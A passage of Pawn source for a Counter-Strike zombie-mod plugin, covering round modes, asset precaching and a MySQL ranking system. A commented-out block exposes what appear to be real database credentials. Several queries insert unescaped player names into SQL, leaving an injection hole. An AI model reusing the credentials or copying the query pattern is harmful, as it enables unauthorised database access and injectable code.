			MakeZombie(0, i, true, false, false);
		}		
		client_cmd(0, "spk %s", g_cStartRoundSurvivorSounds[random_num(0, 1)]);
		set_hudmessage(221, 13, 64, -1.00, 0.17, 1, 0.00, 5.00, 1.00, 1.00, -1);
		ShowSyncHudMsg(0, g_iTopMessageSync, "%s is Survivor !!", g_cName[j]);
		remove_task(600, 0);
		set_task(2.0, "TaskAmbience", 600, "", 0, "", 0);
		g_bModeStarted = true;
		return 0;
	}
	StartAssassinMode(0);
	return 0;
}


StartAssassinMode(iPlayer)
{
	if ((g_iLastMode != 2 && random_num(1, 31) == 1 && !g_iRounds[g_iRoundsCount]) || iPlayer)
	{
		g_iLastMode = 2;
		g_iRoundType = g_iRoundType | 2;
		static j;
		static i;
		i = GetRandomAlive();
		if (iPlayer)
		{
			i = iPlayer;
		}
		j = i;
		MakeZombie(0, i, false, false, true);
		i = 1;
		while (g_iMaxClients + 1 > i)
		{
			if (g_bAlive[i] && !g_bZombie[i] && fm_cs_get_user_team(i) == FM_CS_TEAM_T)
			{
				remove_task ( i + TASK_TEAM );
				fm_cs_set_user_team ( i, FM_CS_TEAM_CT );
				fm_user_team_update ( i );
			}
			i += 1;
		}
		set_lights ( "a" );
		client_cmd(0, "spk %s", g_cStartRoundNemesisSounds[random_num(0, 1)]);
		set_hudmessage(221, 13, 64, -1.00, 0.17, 1, 0.00, 5.00, 1.00, 1.00, -1);
		ShowSyncHudMsg(0, g_iTopMessageSync, "%s is Assassin !!", g_cName[j]);
		remove_task(600, 0);
		set_task(2.0, "TaskAmbience", 600, "", 0, "", 0);
		g_bModeStarted = true;
		return 0;
	}
	StartNemesisMode(0);
	return 0;
}

StartNemesisMode(iPlayer)
{
	if ((g_iLastMode != 1 && random_num(1, 29) == 1 && !g_iRounds[g_iRoundsCount]) || iPlayer)
	{
		g_iLastMode = 1;
		g_iRoundType = g_iRoundType | 1;
		static j;
		static i;
		i = GetRandomAlive();
		if (iPlayer)
		{
			i = iPlayer;
		}
		j = i;
		MakeZombie(0, i, false, true, false);
		i = 1;
		while (g_iMaxClients + 1 > i)
		{
			if (g_bAlive[i] && !g_bZombie[i] && fm_cs_get_user_team(i) == FM_CS_TEAM_T)
			{
				remove_task ( i + TASK_TEAM );
				fm_cs_set_user_team ( i, FM_CS_TEAM_CT );
				fm_user_team_update ( i );
			}
			i += 1;
		}
		client_cmd(0, "spk %s", g_cStartRoundNemesisSounds[random_num(0, 1)]);
		set_hudmessage(221, 13, 64, -1.00, 0.17, 1, 0.00, 5.00, 1.00, 1.00, -1);
		ShowSyncHudMsg(0, g_iTopMessageSync, "%s is Nemesis !!", g_cName[j]);
		remove_task(600, 0);
		set_task(2.0, "TaskAmbience", 600, "", 0, "", 0);
		set_task(1.0, "TaskReminder", 900, "", 0, "", 0)
		g_bModeStarted = true;
		return 0;
	}
	StartNormalMode(0);
	return 0;
}

public TaskReminder()
{
	static cHealth[15];
	static iHealth;
	static i;
	i = 1;
	while (g_iMaxClients + 1 > i)
	{
		if (g_bAlive[i] && g_iPlayerType[i] & 1 && g_bModeStarted && !g_bRoundStart && !g_bRoundEnd)
		{
			iHealth = get_user_health(i);
			AddCommas(iHealth, cHealth, 14);
			client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^1 A^3 Rapture^1 Reminder^3 %s^4 Nemesis^1 still has^3 %s^4 health points!", g_Secret, cHealth);
		}
		i += 1;
	}
	return 0;
}

public task_hide_money(TaskIndex)
{
	if (!g_bAlive[ID_SPAWN])
		return;
	
	message_begin(MSG_ONE, get_user_msgid("HideWeapon"), _, ID_SPAWN)
	write_byte(1<<5)
	message_end()
	
	message_begin(MSG_ONE, get_user_msgid("Crosshair"), _, ID_SPAWN)
	write_byte(0)
	message_end()
}

StartNormalMode(iPlayer)
{
	static j;
	static i;
	i = GetRandomAlive();
	if (iPlayer)
	{
		i = iPlayer;
	}
	j = i;
	MakeZombie(0, i, false, false, false);
	i = 1;
	while (g_iMaxClients + 1 > i)
	{
		if (g_bAlive[i] && !g_bZombie[i] && fm_cs_get_user_team(i) == FM_CS_TEAM_T)
		{
			remove_task ( i + TASK_TEAM );
			fm_cs_set_user_team ( i, FM_CS_TEAM_CT );
			fm_user_team_update ( i );
		}
		i += 1;
	}
	set_hudmessage(255, 0, 0, -1.00, 0.17, 1, 0.00, 5.00, 1.00, 1.00, -1);
	ShowSyncHudMsg(0, g_iTopMessageSync, "%s is the first zombie !!", g_cName[j]);
	remove_task(600, 0);
	set_task(2.0, "TaskAmbience", 600, "", 0, "", 0);
	g_bModeStarted = true;
	return 0;
}

public plugin_precache (  )
{
	new Entity;
	Entity = engfunc ( EngFunc_CreateNamedEntity, engfunc ( EngFunc_AllocString, "hostage_entity" ) );
	if ( pev_valid ( Entity ) )
	{
		engfunc ( EngFunc_SetOrigin, Entity, Float: {8192.0,8192.0,8192.0} );
		
		dllfunc ( DLLFunc_Spawn, Entity );
	}
	Entity = engfunc ( EngFunc_CreateNamedEntity, engfunc ( EngFunc_AllocString, "env_fog" ) );
		
	if ( pev_valid ( Entity ) )
	{
		fm_set_kvd ( Entity, "density", "0.00084655", "env_fog" );
			
		fm_set_kvd ( Entity, "rendercolor", "121 121 121", "env_fog" );
	}
	set_lights ( "d" );
	set_cvar_string("sv_skyname", "space");
	set_cvar_num("sv_skycolor_r", 0);
	set_cvar_num("sv_skycolor_g", 0);
	set_cvar_num("sv_skycolor_b", 0);

	g_vflags = ArrayCreate(64, 1)
	g_vname = ArrayCreate(64, 1)
	g_vpwd = ArrayCreate(64, 1)
	
	if( find_plugin_byfile("zombie_plague_test.amxx") == -1 ) 
	{ 
        set_fail_state("Missing zombie_plague_test.amxx") 
	}
	
	if( find_plugin_byfile("vip.amxx") == -1 ) 
	{ 
        set_fail_state("Missing vip.amxx") 
	}
	
	if( find_plugin_byfile("MapEndManager.amxx") == -1 ) 
	{ 
        set_fail_state("Missing MapEndManager.amxx") 
	}	
	
	if( find_plugin_byfile("Spawn.amxx") == -1 ) 
	{ 
        set_fail_state("Missing Spawn.amxx") 
	}	
	
	if( find_plugin_byfile("Admins.amxx") == -1 ) 
	{ 
        set_fail_state("Missing Admins.amxx") 
	}	

	if( find_plugin_byfile("MapEndManager_Second.amxx") == -1 ) 
	{ 
        set_fail_state("Missing MapEndManager_Second.amxx") 
	}		

	iFwSpawnHook = register_forward  (FM_Spawn, "OnFakemetaSpawn", 0 );
	precache_model( "models/ZombieOutstanding/p_golden_ak47.mdl" );
	precache_model( "models/ZombieOutstanding/v_golden_ak47.mdl" );
	precache_model( "models/ZombieOutstanding/p_golden_deagle.mdl" );
	precache_model( "models/ZombieOutstanding/v_golden_deagle.mdl" );
	precache_model( "models/rpgrocket.mdl" );
	precache_model( "models/p_egon.mdl" );
	precache_model( "models/v_egon.mdl" );
	precache_model( "models/ZombieOutstanding/z_out_nemesis_claws.mdl" );
	precache_model( "models/ZombieOutstanding/z_out_assassin_claws.mdl" );
	precache_model( "models/ZombieOutstanding/z_out_clasic_claws.mdl" );
	precache_model( "models/ZombieOutstanding/z_out_raptor_claws.mdl" );
	precache_model( "models/ZombieOutstanding/z_out_mutant_claws.mdl" );
	precache_model( "models/ZombieOutstanding/z_out_tight_claws.mdl" );
	precache_model( "models/ZombieOutstanding/z_out_hunter_claws.mdl" );
	precache_model( "models/ZombieOutstanding/z_out_predator_blue_claws.mdl" );
	precache_model( "models/ZombieOutstanding/z_out_v_grenade_infection.mdl" );
	precache_model( "models/ZombieOutstanding/z_out_p_grenade_infection.mdl" );
	precache_model( "models/ZombieOutstanding/z_out_v_awp_sniper.mdl" );
	precache_model( "models/ZombieOutstanding/z_out_p_awp_sniper.mdl" );
	precache_model( "models/player/DanDiaconescu/DanDiaconescu.mdl" );
	precache_model( "models/player/z_out_nemesis/z_out_nemesis.mdl" );
	precache_model( "models/player/z_out_survivor/z_out_survivor.mdl" );
	precache_model( "models/player/z_out_assassin/z_out_assassin.mdl" );
	precache_model( "models/player/z_out_admin/z_out_admin.mdl" );
	precache_model( "models/player/z_out_clasic/z_out_clasic.mdl" );
	precache_model( "models/player/z_out_raptor/z_out_raptor.mdl" );
	precache_model( "models/player/z_out_mutant/z_out_mutant.mdl" );
	precache_model( "models/player/z_out_tight/z_out_tight.mdl" );
	precache_model( "models/player/z_out_regenerator/z_out_regenerator.mdl" );
	precache_model( "models/player/z_out_predator_blue/z_out_predator_blue.mdl" );
	precache_model( "models/player/z_out_hunter/z_out_hunter.mdl" );
	precache_model( "models/ZombieOutstanding/z_out_mine.mdl" );	
	precache_sound( "ZombieOutstanding/armor_hit.wav" );
	precache_sound( "ZombieOutstanding/ambience_survivor.wav" );
	precache_sound( "ZombieOutstanding/ambience_normal.wav" );
	precache_sound( "ZombieOutstanding/monster_hit_01.wav" );
	precache_sound( "ZombieOutstanding/monster_hit_02.wav" );
	precache_sound( "ZombieOutstanding/monster_hit_03.wav" );
	precache_sound( "ZombieOutstanding/zombie_hit_01.wav" );
	precache_sound( "ZombieOutstanding/zombie_hit_02.wav" );
	precache_sound( "ZombieOutstanding/zombie_hit_03.wav" );
	precache_sound( "ZombieOutstanding/zombie_hit_04.wav" );
	precache_sound( "ZombieOutstanding/zombie_hit_05.wav" );
	precache_sound( "ZombieOutstanding/zombie_die_01.wav" );
	precache_sound( "ZombieOutstanding/zombie_die_02.wav" );
	precache_sound( "ZombieOutstanding/zombie_die_03.wav" );
	precache_sound( "ZombieOutstanding/zombie_die_04.wav" );
	precache_sound( "ZombieOutstanding/zombie_die_05.wav" );
	precache_sound( "ZombieOutstanding/zombie_infect_01.wav" );
	precache_sound( "ZombieOutstanding/zombie_infect_02.wav" );
	precache_sound( "ZombieOutstanding/zombie_infect_03.wav" );
	precache_sound( "ZombieOutstanding/zombie_infect_04.wav" );
	precache_sound( "ZombieOutstanding/zombie_infect_05.wav" );
	precache_sound( "ZombieOutstanding/end_round_win_zombies_01.wav" );
	precache_sound( "ZombieOutstanding/end_round_win_zombies_02.wav" );
	precache_sound( "ZombieOutstanding/end_round_win_zombies_03.wav" );
	precache_sound( "ZombieOutstanding/end_round_win_zombies_04.wav" );
	precache_sound( "ZombieOutstanding/end_round_win_humans_01.wav" );
	precache_sound( "ZombieOutstanding/end_round_win_humans_02.wav" );
	precache_sound( "ZombieOutstanding/end_round_win_humans_03.wav" );
	precache_sound( "ZombieOutstanding/end_round_win_no_one.wav" );
	precache_sound( "ZombieOutstanding/round_start_survivor_01.wav" );
	precache_sound( "ZombieOutstanding/round_start_survivor_02.wav" );
	precache_sound( "ZombieOutstanding/round_start_nemesis_01.wav" );
	precache_sound( "ZombieOutstanding/round_start_nemesis_02.wav" );
	precache_sound( "ZombieOutstanding/round_start_plague.wav" );
	precache_sound( "ZombieOutstanding/grenade_infection_explode.wav" );
	precache_sound( "ZombieOutstanding/grenade_fire_explode.wav" );
	precache_sound( "ZombieOutstanding/grenade_frost_explode.wav" );
	precache_sound( "ZombieOutstanding/grenade_frost_freeze.wav" );
	precache_sound( "ZombieOutstanding/grenade_frost_break.wav" );
	precache_sound( "ZombieOutstanding/jetpack_fly.wav" );
	precache_sound( "ZombieOutstanding/jetpack_blow.wav" );
	precache_sound( "ZombieOutstanding/rocket_fire.wav" );
	precache_sound( "ZombieOutstanding/gun_pickup.wav" );
	precache_sound( "ZombieOutstanding/zombie_burn_01.wav" );
	precache_sound( "ZombieOutstanding/zombie_burn_02.wav" );
	precache_sound( "ZombieOutstanding/zombie_burn_03.wav" );
	precache_sound( "ZombieOutstanding/zombie_burn_04.wav" );
	precache_sound( "ZombieOutstanding/zombie_burn_05.wav" );
	precache_sound( "ZombieOutstanding/human_nade_infect_scream_01.wav" );
	precache_sound( "ZombieOutstanding/human_nade_infect_scream_02.wav" );
	precache_sound( "ZombieOutstanding/human_nade_infect_scream_03.wav" );
	precache_sound( "ZombieOutstanding/zombie_madness.wav" );
	precache_sound( "ZombieOutstanding/antidote.wav" );
	precache_sound( "ZombieOutstanding/mine_activate.wav" );
	precache_sound( "ZombieOutstanding/mine_deploy.wav" );
	precache_sound( "ZombieOutstanding/mine_charge.wav" );
	precache_sound( "ZombieOutstanding/armor_equip.wav" );
	precache_sound( "fvox/flatline.wav" );
	SpriteTexture = precache_model("sprites/lgtning.spr");
	g_iLaser = precache_model("sprites/laserbeam.spr");
	ExploSpr = engfunc(EngFunc_PrecacheModel, "sprites/shockwave.spr");
	FlameSpr = engfunc(EngFunc_PrecacheModel, "sprites/ZombieOutstanding/z_out_flame.spr");
	SmokeSpr = engfunc(EngFunc_PrecacheModel, "sprites/black_smoke3.spr");
	GlassSpr = engfunc(EngFunc_PrecacheModel, "models/glassgibs.mdl");
	HExplode = engfunc(EngFunc_PrecacheModel, "sprites/zerogxplode.spr");
	TrailSpr = engfunc(EngFunc_PrecacheModel, "sprites/laserbeam.spr");
	g_hExplode = precache_model("sprites/zerogxplode.spr");	
}

//#define SQL_Server "93.119.27.56"
//#define SQL_Person "gpkr_4502"
//#define SQL_Password "`D#M5WpV@_9`7p{&"
//#define SQL_Database "gpkr_4502"

#define SQL_Server ""
#define SQL_Person ""
#define SQL_Password ""
#define SQL_Database "StatsDb"

computeTimeLength(Time, timeUnit:unitType, Output[], outputSize)
{
	static Weeks = 0, Days = 0, Hours = 0, Minutes = 0, Seconds = 0, \
		maxElementId = 0, timeElement[5][64], Length = 0;

	if (Time > 0)
	{
		maxElementId = 0;

		switch (unitType)
		{
			case timeUnit_Seconds: Seconds = Time;
			case timeUnit_Minutes: Seconds = Time * 60;
			case timeUnit_Hours: Seconds = Time * 3600;
			case timeUnit_Days: Seconds = Time * 86400;
			case timeUnit_Weeks: Seconds = Time * 604800;
		}

		Weeks = Seconds / 604800;
		Seconds -= (Weeks * 604800);

		Days = Seconds / 86400;
		Seconds -= (Days * 86400);

		Hours = Seconds / 3600;
		Seconds -= (Hours * 3600);

		Minutes = Seconds / 60;
		Seconds -= (Minutes * 60);

		if (Weeks > 0)
			formatex(timeElement[maxElementId++], charsmax(timeElement[]), "%d w", Weeks);

		if (Days > 0)
			formatex(timeElement[maxElementId++], charsmax(timeElement[]), "%d d", Days);

		if (Hours > 0)
			formatex(timeElement[maxElementId++], charsmax(timeElement[]), "%d h", Hours);

		if (Minutes > 0)
			formatex(timeElement[maxElementId++], charsmax(timeElement[]), "%d m", Minutes);

		if (Seconds > 0)
			formatex(timeElement[maxElementId++], charsmax(timeElement[]), "%d s", Seconds);

		switch (maxElementId)
		{
			case 1: Length = formatex(Output, outputSize, "%s", timeElement[0]);
			case 2: Length = formatex(Output, outputSize, "%s %s", timeElement[0], timeElement[1]);
			case 3: Length = formatex(Output, outputSize, "%s %s %s", timeElement[0], timeElement[1], \
						timeElement[2]);
			case 4: Length = formatex(Output, outputSize, "%s %s %s %s", timeElement[0], timeElement[1], \
						timeElement[2], timeElement[3]);
			case 5: Length = formatex(Output, outputSize, "%s %s %s %s %s", timeElement[0], timeElement[1], \
						timeElement[2], timeElement[3], timeElement[4]);
		}

		return Length;
	}

	Length = formatex(Output, outputSize, "0 m");

	return Length;
}

bool:isValidPlayer(Player)
{
	return bool:(Player >= 1 && Player <= g_iMaxClients);
}

resetPlayer(Player)
{
	static timeNow = 0;

	if (isValidPlayer(Player) && !is_user_bot(Player) && !is_user_hltv(Player))
	{
		timeNow = get_systime();
		g_Score[Player] = 1000;
		g_Kills[Player] = 0;
		g_Deaths[Player] = 0;
		g_headShots[Player] = 0;
		g_Time[Player] = 0;
		computeTimeLength(g_Time[Player], timeUnit_Minutes, g_timeString[Player], charsmax(g_timeString[]));
		g_Seen[Player] = timeNow;
		format_time(g_seenString[Player], charsmax(g_seenString[]), "%d.%m.%Y @ %H:%M");
		g_kpdRatio[Player] = 0.0;
		g_kmdValue[Player] = 0;
	}
}

Float:computeKpdRatio(Player)
{
	if (isValidPlayer(Player) && is_user_connected(Player) && is_user_bot(Player) == 0 && is_user_hltv(Player) == 0)
	{
		if (g_Deaths[Player] == 0)
		{
			return float(g_Kills[Player]);
		}

		else
		{
			return float(g_Kills[Player] / g_Deaths[Player]);
		}
	}

	return 0.0;
}

computeKmdValue(Player)
{
	if (isValidPlayer(Player) && is_user_connected(Player) && is_user_bot(Player) == 0 && is_user_hltv(Player) == 0)
	{
		return g_Kills[Player] - g_Deaths[Player];
	}

	return 0;
}

updateRank(Client)
{
	if (isValidPlayer(Client) && is_user_connected(Client) && is_user_bot(Client) == 0 && is_user_hltv(Client) == 0)
	{
		formatex(g_Query, charsmax(g_Query), "UPDATE Players SET Ip = '%s', Score = %d, Kills = %d, Deaths = %d, \
			headShots = %d, Seen = %d, seenString = '%s', kpdRatio = %f, kmdValue = %d WHERE Name = '%s';", \
			g_Ip[Client], g_Score[Client], g_Kills[Client], g_Deaths[Client], g_headShots[Client], \
			g_Seen[Client], g_seenString[Client], g_kpdRatio[Client], g_kmdValue[Client], g_Name[Client]);

		SQL_ThreadQuery(g_Tuple, "emptyFunction", g_Query);
	}
}

public NewStats_GetTop15(pluginId, parametersCount)
{
	static Name[15][64], Total, Error[256], errorId, Handle:Connection, Handle:Query, Iterator;

	Connection = SQL_Connect(g_Tuple, errorId, Error, charsmax(Error));

	if (errorId)
	{
		log_to_file("ZombieOutStanding_Stats_Error.log", "NewStats_GetTop15() failed because SQL has encountered an error.");
		log_to_file("ZombieOutStanding_Stats_Error.log", "The error is listed below.");
		log_to_file("ZombieOutStanding_Stats_Error.log", "[%d] %s", errorId, Error);

		return 0;
	}

	Query = SQL_PrepareQuery(Connection, "SELECT Name FROM Players ORDER BY kmdValue DESC LIMIT 15;");
	SQL_Execute(Query);

	if (SQL_NumResults(Query) == 0)
	{
		SQL_FreeHandle(Query);
		SQL_FreeHandle(Connection);

		return 0;
	}

	Total = 0;

	while (SQL_MoreResults(Query))
	{
		SQL_ReadResult(Query, 0, Name[Total++], charsmax(Name[]));

		SQL_NextRow(Query);
	}

	SQL_FreeHandle(Query);
	SQL_FreeHandle(Connection);

	for (Iterator = 0; Iterator < Total; Iterator++)
		set_string(Iterator + 1, Name[Iterator], charsmax(Name[]));

	return Total;
}

public NewStats_GetStats(pluginId, parametersCount)
{
	static Name[64], Error[256], errorId, Handle:Connection, Handle:Query, Kills[16], Deaths[16], \
		headShots[16], Score[16], Ip[64], Steam[64], Time[16], timeString[64], Seen[16], \
		seenString[64], kpdRatio[16], kmdValue[16], Kills_i, Deaths_i, headShots_i, Score_i, \
		Time_i, Seen_i, Float:kpdRatio_f, kmdValue_i, Rank[16], Rank_i, totalPositions[16];

	get_string(1, Name, charsmax(Name));

	replace_all(Name, charsmax(Name), "`", "*");
	replace_all(Name, charsmax(Name), "'", "*");
	replace_all(Name, charsmax(Name), "\", "*");

	Connection = SQL_Connect(g_Tuple, errorId, Error, charsmax(Error));

	if (errorId)
	{
		log_to_file("ZombieOutStanding_Stats_Error.log", "NewStats_GetStats() failed because SQL has encountered an error.");
		log_to_file("ZombieOutStanding_Stats_Error.log", "The error is listed below.");
		log_to_file("ZombieOutStanding_Stats_Error.log", "[%d] %s", errorId, Error);

		return 0;
	}

	formatex(g_Query, charsmax(g_Query), "SELECT Steam, Ip, Score, Kills, Deaths, headShots, Time, timeString, Seen, seenString, kpdRatio, kmdValue FROM Players WHERE Name = '%s';", Name);

	Query = SQL_PrepareQuery(Connection, g_Query);
	SQL_Execute(Query);

	if (SQL_NumResults(Query) == 0)
	{
		SQL_FreeHandle(Query);
		SQL_FreeHandle(Connection);

		return 0;
	}

	SQL_ReadResult(Query, 0, Steam, charsmax(Steam));
	SQL_ReadResult(Query, 1, Ip, charsmax(Ip));
	Score_i = SQL_ReadResult(Query, 2);
	num_to_str(Score_i, Score, charsmax(Score));
	Kills_i = SQL_ReadResult(Query, 3);
	num_to_str(Kills_i, Kills, charsmax(Kills));
	Deaths_i = SQL_ReadResult(Query, 4);
	num_to_str(Deaths_i, Deaths, charsmax(Deaths));
	headShots_i = SQL_ReadResult(Query, 5);
	num_to_str(headShots_i, headShots, charsmax(headShots));
	Time_i = SQL_ReadResult(Query, 6);
	num_to_str(Time_i, Time, charsmax(Time));
	SQL_ReadResult(Query, 7, timeString, charsmax(timeString));
	Seen_i = SQL_ReadResult(Query, 8);
	num_to_str(Seen_i, Seen, charsmax(Seen));
	SQL_ReadResult(Query, 9, seenString, charsmax(seenString));
	SQL_ReadResult(Query, 10, kpdRatio_f);
	float_to_str(kpdRatio_f, kpdRatio, charsmax(kpdRatio));
	kmdValue_i = SQL_ReadResult(Query, 11);
	num_to_str(kmdValue_i, kmdValue, charsmax(kmdValue));

	SQL_FreeHandle(Query);

	set_string(2, Steam, charsmax(Steam));
	set_string(3, Ip, charsmax(Ip));
	set_string(4, Score, charsmax(Score));
	set_string(5, Kills, charsmax(Kills));
	set_string(6, Deaths, charsmax(Deaths));
	set_string(7, headShots, charsmax(headShots));
	set_string(8, Time, charsmax(Time));
	set_string(9, timeString, charsmax(timeString));
	set_string(10, Seen, charsmax(Seen));
	set_string(11, seenString, charsmax(seenString));
	set_string(12, kpdRatio, charsmax(kpdRatio));
	set_string(13, kmdValue, charsmax(kmdValue));

	formatex(g_Query, charsmax(g_Query), "SELECT DISTINCT kmdValue FROM Players WHERE kmdValue >= %d ORDER BY kmdValue ASC;", kmdValue_i);

	Query = SQL_PrepareQuery(Connection, g_Query);
	SQL_Execute(Query);

	Rank_i = SQL_NumResults(Query);
	num_to_str(Rank_i, Rank, charsmax(Rank));

	SQL_FreeHandle(Query);
	SQL_FreeHandle(Connection);

	set_string(14, Rank, charsmax(Rank));

	num_to_str(g_recordsCount, totalPositions, charsmax(totalPositions));
	set_string(15, totalPositions, charsmax(totalPositions));

	return 1;
}

public recordsCount(failState, Handle:Query, Error[], errorId, Data[], dataSize, Float:queueTime)
{
	if (failState != 0 || errorId != 0)
	{
		log_to_file("ZombieOutStanding_Stats_Error.log", "SQL_ThreadQuery() failed @ recordsCount()");
		log_to_file("ZombieOutStanding_Stats_Error.log", "[%d] %s", errorId, Error);
	}

	else if (queueTime > 15.0)
	{
		log_to_file("ZombieOutStanding_Stats_Error.log", "SQL_ThreadQuery() @ recordsCount() :  This query took 15.0 seconds. \
		Talk to the game host company tell them the MySQL database works too slow.");
	}

	g_recordsCount = SQL_NumResults(Query);
}

public emptyFunction(failState, Handle:Query, Error[], errorId, Data[], dataSize, Float:queueTime)
{
	if (failState != 0 || errorId != 0)
	{
		log_to_file("ZombieOutStanding_Stats_Error.log", "SQL_ThreadQuery() failed @ emptyFunction()");
		log_to_file("ZombieOutStanding_Stats_Error.log", "[%d] %s", errorId, Error);
	}

	else if (queueTime > 15.0)
	{
		log_to_file("ZombieOutStanding_Stats_Error.log", "SQL_ThreadQuery() @ emptyFunction() :  This query took 15.0 seconds. \
		Talk to the game host company tell them the MySQL database works too slow.");
	}
}

public retrieveOrCreatePlayer(failState, Handle:Query, Error[], errorId, Data[], dataSize, Float:queueTime)
{
	static Client = 0;

	if (failState != 0 || errorId != 0)
	{
		log_to_file("ZombieOutStanding_Stats_Error.log", "SQL_ThreadQuery() failed @ retrieveOrCreatePlayer()");
		log_to_file("ZombieOutStanding_Stats_Error.log", "[%d] %s", errorId, Error);
	}

	else if (queueTime > 15.0)
	{
		log_to_file("ZombieOutStanding_Stats_Error.log", "SQL_ThreadQuery() @ retrieveOrCreatePlayer() :  This query took 15.0 seconds. \
		Talk to the game host company tell them the MySQL database works too slow.");
	}

	Client = str_to_num(Data);

	if (is_user_connected(Client) == 1 && is_user_bot(Client) == 0 && is_user_hltv(Client) == 0)
	{
		resetPlayer(Client);

		switch (SQL_NumResults(Query))
		{
			case 0:
			{
				formatex(g_Query, charsmax(g_Query), "INSERT INTO Players VALUES ('%s', \
					'%s', '%s', %d, %d, %d, %d, %d, '%s', %d, '%s', %f, %d);", g_Name[Client], \
					g_Steam[Client], g_Ip[Client], g_Score[Client], g_Kills[Client], \
					g_Deaths[Client], g_headShots[Client], g_Time[Client], g_timeString[Client], g_Seen[Client], \
					g_seenString[Client], g_kpdRatio[Client], g_kmdValue[Client]);

				SQL_ThreadQuery(g_Tuple, "emptyFunction", g_Query);

				g_recordsCount++;
			}

			default:
			{
				g_Score[Client] = SQL_ReadResult(Query, 0);
				g_Kills[Client] = SQL_ReadResult(Query, 1);
				g_Deaths[Client] = SQL_ReadResult(Query, 2);
				g_headShots[Client] = SQL_ReadResult(Query, 3);
				g_Time[Client] = SQL_ReadResult(Query, 4);
				SQL_ReadResult(Query, 5, g_timeString[Client], charsmax(g_timeString[]));
				g_Seen[Client] = SQL_ReadResult(Query, 6);
				SQL_ReadResult(Query, 7, g_seenString[Client], charsmax(g_seenString[]));
				SQL_ReadResult(Query, 8, g_kpdRatio[Client]);
				g_kmdValue[Client] = SQL_ReadResult(Query, 9);
			}
		}

		set_task(7.0, "rankPrepared", Client);
		set_task(300.0, "timeUpdate", Client + 400, "", 0, "b", 0);
	}
}

public timeUpdate(iTask)
{
	if (is_user_connected(iTask + -400) && !is_user_bot(iTask + -400) && !is_user_hltv(iTask + -400))
	{
		g_Time[iTask + -400] += 2;

		computeTimeLength(g_Time[iTask + -400], \
		timeUnit_Minutes, g_timeString[iTask + -400], charsmax(g_timeString[]));

		formatex(g_Query, charsmax(g_Query), \
		"UPDATE Players SET Time = %d, timeString = '%s' WHERE Name = '%s';", \
		g_Time[iTask + -400], g_timeString[iTask + -400], g_Name[iTask + -400]);

		SQL_ThreadQuery(g_Tuple, "emptyFunction", g_Query);
	}
}

public rankPrepared(Client)
{
	static queryData[32] = { 0, ... };

	if (is_user_connected(Client) == 1 && is_user_bot(Client) == 0 && is_user_hltv(Client) == 0)
	{
		set_dhudmessage(0, 255, 0, 0.02, 0.70, 2, 6.0, 3.0);
		show_dhudmessage(Client, "You are now ranked!");
	
		num_to_str(Client, queryData, charsmax(queryData));

		formatex(g_Query, charsmax(g_Query), "SELECT DISTINCT kmdValue \
		FROM Players WHERE kmdValue >= %d ORDER BY kmdValue ASC;", g_kmdValue[Client]);

		SQL_ThreadQuery(g_Tuple, "showRank", g_Query, queryData, sizeof(queryData));
		
		g_bRanked[Client] = true;
	}
}

public showRank(failState, Handle:Query, Error[], errorId, Data[], dataSize, Float:queueTime)
{
	static Client = 0, Rank = 0, rankString[16], recordsString[16], scoreString[16], killsString[16], deathsString[16], headShotsString[16];
		
	if (failState != 0 || errorId != 0)
	{
		log_to_file("ZombieOutStanding_Stats_Error.log", "SQL_ThreadQuery() failed @ showRank()");
		log_to_file("ZombieOutStanding_Stats_Error.log", "[%d] %s", errorId, Error);
	}

	else if (queueTime > 15.0)
	{
		log_to_file("ZombieOutStanding_Stats_Error.log", "SQL_ThreadQuery() @ showRank() :  This query took 15.0 seconds. \
		Talk to the game host company tell them the MySQL database works too slow.");
	}

	Client = str_to_num(Data);

	if (is_user_connected(Client) == 1 && is_user_bot(Client) == 0 && is_user_hltv(Client) == 0)
	{
		Rank = SQL_NumResults(Query);

		AddCommas(Rank, rankString, charsmax(rankString));
		AddCommas(g_recordsCount, recordsString, charsmax(recordsString));
		AddCommas(g_Kills[Client], killsString, charsmax(killsString));
		AddCommas(g_Deaths[Client], deathsString, charsmax(deathsString));
		AddCommas(g_Score[Client], scoreString, charsmax(scoreString));
		AddCommas(g_headShots[Client], headShotsString, charsmax(headShotsString));	
		
		new HostName [64]; get_cvar_string ( "hostname", HostName, charsmax ( HostName ) );

		set_dhudmessage(0, 255, 0, 0.02, 0.2, 2, 0.02, 1.0, 6.0, 8.0);
		show_dhudmessage(Client, "Welcome, %s^nRank: %s of %s Score: %d^nKills: %s Deaths: %s KPD: %0.2f^nOnline: %s^nEnjoy!",
		g_Name[Client], rankString, recordsString, g_Score[Client] = 1000, \
		killsString, deathsString, g_kpdRatio[Client], g_timeString[Client]);
		
		
		set_dhudmessage(157, 103, 200, 0.02, 0.5, 2, 6.0, 8.0)
		show_dhudmessage(Client, "%s^nDon't forget to add us to your favourites!",HostName);
	}
}

public printRankChat(failState, Handle:Query, Error[], errorId, Data[], dataSize, Float:queueTime)
{
	static cScore[15];
	static cDeaths[15];
	static cKills[15];
	static cTotal[15];
	static cRank[15];
	static Rank;
	static iPlayer;
	iPlayer = str_to_num(Data);
	Rank = SQL_NumResults(Query);
	AddCommas(Rank, cRank, 15);
	AddCommas(g_recordsCount, cTotal, 15);
	AddCommas(g_Deaths[iPlayer], cDeaths, 15);
	AddCommas(g_Kills[iPlayer], cKills, 15);
	AddCommas(g_Score[iPlayer], cScore, 15);
	g_iMenu = menu_create("Ranking", "EmptyPanel", 0);
	formatex(g_cQuery, 255, "Rank: %s of %s  Score: %s", cRank, cTotal, cScore);
	menu_additem(g_iMenu, g_cQuery, "1", 0, -1);
	if (failState != 0 || errorId != 0)
	{
		log_to_file("ZombieOutStanding_Stats_Error.log", "SQL_ThreadQuery() failed @ printRankChat()");
		log_to_file("ZombieOutStanding_Stats_Error.log", "[%d] %s", errorId, Error);
	}	
	else if (queueTime > 15.0)
	{
		log_to_file("ZombieOutStanding_Stats_Error.log", "SQL_ThreadQuery() @ printRankChat() :  This query took 15.0 seconds. \
		Talk to the game host company tell them the MySQL database works too slow.");
	}	
	formatex(g_cQuery, 255, "Kills: %s  Deaths: %s  KPD: %0.2f", cKills, cDeaths, g_kpdRatio[iPlayer]);
	menu_additem(g_iMenu, g_cQuery, "2", 0, -1);
	formatex(g_cQuery, 255, "Online: %s", g_timeString[iPlayer]);
	menu_additem(g_iMenu, g_cQuery, "3", 0, -1);
	menu_setprop(g_iMenu, 6, -1);
	menu_display(iPlayer, g_iMenu, 0);

